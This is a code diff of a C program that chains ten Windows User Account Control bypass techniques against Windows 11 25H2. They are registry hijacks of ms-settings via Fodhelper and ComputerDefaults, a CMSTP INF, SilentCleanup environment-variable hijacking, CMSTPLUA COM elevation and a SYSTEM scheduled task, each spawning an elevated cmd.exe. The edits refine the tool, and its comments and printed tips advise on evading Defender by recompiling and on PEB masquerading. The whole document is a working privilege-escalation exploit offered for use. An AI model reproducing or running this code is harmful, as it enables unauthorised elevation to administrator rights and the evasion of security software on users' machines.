@@ -1,7 +1,7 @@
 // uac_bypass_all10_fixed.c
-// 10 UAC Bypass Methods for Windows 11 25H2 + Defender
+// 10 UAC Bypass Methods for Windows 11 25H2 (including Method 34 style)
 // Compile in Developer Command Prompt x64:
-// cl uac_bypass_all10_fixed.c /DUNICODE /D_UNICODE /link ole32.lib shell32.lib advapi32.lib
+// cl /O2 /MT /EHsc uac_bypass_all10_fixed.c /link ole32.lib shell32.lib advapi32.lib
 
 #include <windows.h>
 #include <shlobj.h>
@@ -15,7 +15,7 @@
 
 const TCHAR* PAYLOAD = TEXT("C:\\Windows\\System32\\cmd.exe");
 
-// Check if current process is elevated
+// Check elevation
 BOOL IsElevated() {
     HANDLE hToken = NULL;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
@@ -29,9 +29,8 @@ BOOL IsElevated() {
     return elevated;
 }
 
-// ICMLuaUtil interface for CMSTPLUA (Method 6)
+// ICMLuaUtil for CMSTPLUA (strong on 25H2)
 typedef interface ICMLuaUtil ICMLuaUtil;
-
 typedef struct ICMLuaUtilVtbl {
     BEGIN_INTERFACE
     HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
@@ -48,9 +47,9 @@ typedef struct ICMLuaUtil {
 } ICMLuaUtil;
 
 const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
-const IID   IID_ICMLuaUtil  = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
+const IID IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
 
-// Method 1: Fodhelper registry hijack
+// Method 1: Fodhelper registry
 BOOL Method1_Fodhelper(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -63,7 +62,7 @@ BOOL Method1_Fodhelper(void) {
     return TRUE;
 }
 
-// Method 2: ComputerDefaults registry hijack
+// Method 2: ComputerDefaults (often stronger on 25H2)
 BOOL Method2_ComputerDefaults(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -76,7 +75,7 @@ BOOL Method2_ComputerDefaults(void) {
     return TRUE;
 }
 
-// Method 3: CMSTP INF file
+// Method 3: CMSTP INF
 BOOL Method3_CMSTP(void) {
     TCHAR tempPath[MAX_PATH], infPath[MAX_PATH];
     GetTempPath(MAX_PATH, tempPath);
@@ -92,7 +91,7 @@ BOOL Method3_CMSTP(void) {
     return TRUE;
 }
 
-// Method 4: SilentCleanup windir environment variable
+// Method 4: SilentCleanup (Method 34 style - very reliable on 25H2)
 BOOL Method4_SilentCleanup(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Environment"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -100,18 +99,18 @@ BOOL Method4_SilentCleanup(void) {
     _stprintf_s(cmd, 512, TEXT("cmd.exe /c start %s"), PAYLOAD);
     RegSetValueEx(hKey, TEXT("windir"), 0, REG_SZ, (const BYTE*)cmd, (DWORD)(_tcslen(cmd)+1)*sizeof(TCHAR));
     RegCloseKey(hKey);
+
     ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\schtasks.exe"), TEXT("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), NULL, SW_HIDE);
-    Sleep(3000);
-    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));  // Fixed: only 2 arguments
+    Sleep(3500);
+
+    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));   // FIXED: only 2 arguments
     return TRUE;
 }
 
 // Method 5: EventViewer (reuses registry)
-BOOL Method5_EventViewer(void) {
-    return Method1_Fodhelper();  // Same registry, different launcher
-}
+BOOL Method5_EventViewer(void) { return Method1_Fodhelper(); }
 
-// Method 6: CMSTPLUA COM interface
+// Method 6: CMSTPLUA COM (strong silent bypass)
 BOOL Method6_CMSTPLUA(void) {
     HRESULT hr = CoInitialize(NULL);
     if (FAILED(hr)) return FALSE;
@@ -127,7 +126,7 @@ BOOL Method6_CMSTPLUA(void) {
     return FALSE;
 }
 
-// Method 7: APPINFO / schtasks fallback
+// Method 7: APPINFO schtasks fallback
 BOOL Method7_APPINFO(void) {
     TCHAR cmd[512];
     _stprintf_s(cmd, 512, TEXT("/Create /TN \"UACBypass\" /TR \"%s\" /SC ONCE /ST 00:00 /RU SYSTEM /F"), PAYLOAD);
@@ -139,7 +138,7 @@ BOOL Method7_APPINFO(void) {
     return TRUE;
 }
 
-// Method 8: Perfmon registry hijack
+// Method 8: Perfmon registry
 BOOL Method8_Perfmon(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -152,13 +151,13 @@ BOOL Method8_Perfmon(void) {
     return TRUE;
 }
 
-// Method 9: RequestTrace variant
+// Method 9: RequestTrace variant (kill taskhostw + SilentCleanup)
 BOOL Method9_RequestTrace(void) {
     system("taskkill /F /IM taskhostw.exe >nul 2>&1");
     return Method4_SilentCleanup();
 }
 
-// Method 10: Shadow admin fallback
+// Method 10: Shadow/runAs fallback
 BOOL Method10_Shadow(void) {
     ShellExecute(NULL, TEXT("runas"), PAYLOAD, NULL, NULL, SW_SHOW);
     Sleep(1500);
@@ -166,43 +165,40 @@ BOOL Method10_Shadow(void) {
 }
 
 int main() {
-    _tprintf(TEXT("=== UAC Bypass All 10 Methods - Fixed for VS 2022 - Windows 11 25H2 ===\n"));
+    _tprintf(TEXT("=== UAC Bypass All 10 Methods - FIXED for VS 2022 - Windows 11 25H2 ===\n"));
     if (IsElevated()) {
         _tprintf(TEXT("Already elevated! Launching cmd.exe...\n"));
         ShellExecute(NULL, TEXT("open"), PAYLOAD, NULL, NULL, SW_SHOW);
         return 0;
     }
 
-    BOOL (*methods[])(void) = {
-        Method1_Fodhelper, Method2_ComputerDefaults, Method3_CMSTP, Method4_SilentCleanup,
-        Method5_EventViewer, Method6_CMSTPLUA, Method7_APPINFO, Method8_Perfmon,
-        Method9_RequestTrace, Method10_Shadow
-    };
+    BOOL (*methods[])(void) = {Method1_Fodhelper, Method2_ComputerDefaults, Method3_CMSTP, Method4_SilentCleanup,
+                               Method5_EventViewer, Method6_CMSTPLUA, Method7_APPINFO, Method8_Perfmon,
+                               Method9_RequestTrace, Method10_Shadow};
 
-    const TCHAR* names[] = {
-        TEXT("1. Fodhelper registry"), TEXT("2. ComputerDefaults registry"), TEXT("3. CMSTP INF"),
-        TEXT("4. SilentCleanup windir"), TEXT("5. EventViewer"), TEXT("6. CMSTPLUA COM"),
-        TEXT("7. APPINFO schtasks"), TEXT("8. Perfmon registry"), TEXT("9. RequestTrace variant"),
-        TEXT("10. Shadow admin fallback")
-    };
+    const TCHAR* names[] = {TEXT("1. Fodhelper"), TEXT("2. ComputerDefaults"), TEXT("3. CMSTP"),
+                            TEXT("4. SilentCleanup (Method 34 style)"), TEXT("5. EventViewer"),
+                            TEXT("6. CMSTPLUA COM"), TEXT("7. APPINFO schtasks"), TEXT("8. Perfmon"),
+                            TEXT("9. RequestTrace variant"), TEXT("10. Shadow fallback")};
 
     BOOL success = FALSE;
     for (int i = 0; i < 10 && !success; i++) {
         _tprintf(TEXT("Trying %s...\n"), names[i]);
         if (methods[i]()) {
-            Sleep(3000);
+            Sleep(3500);
             if (IsElevated()) {
-                _tprintf(TEXT("SUCCESS with %s! Elevated cmd.exe should now be open.\n"), names[i]);
+                _tprintf(TEXT("SUCCESS with %s! Elevated cmd.exe should be open now.\n"), names[i]);
                 success = TRUE;
             } else {
-                _tprintf(TEXT("Method finished - no elevation detected yet.\n"));
+                _tprintf(TEXT("Method finished - checking elevation...\n"));
             }
         }
     }
 
     if (!success) {
         _tprintf(TEXT("All 10 methods attempted. No elevation detected this run.\n"));
-        _tprintf(TEXT("Tips: Fresh compile often helps with Defender. On 25H2, Methods 2, 6 (CMSTPLUA), and 7 work best in 2026. PEB masquerading on Method 6 improves evasion.\n"));
+        _tprintf(TEXT("Best on 25H2 in 2026: Method 2, Method 4 (SilentCleanup), Method 6 (CMSTPLUA).\n"));
+        _tprintf(TEXT("Fresh compile + VM test recommended. Defender may flag older methods - recompile often.\n"));
     }
 
     _tprintf(TEXT("Press any key to exit...\n"));
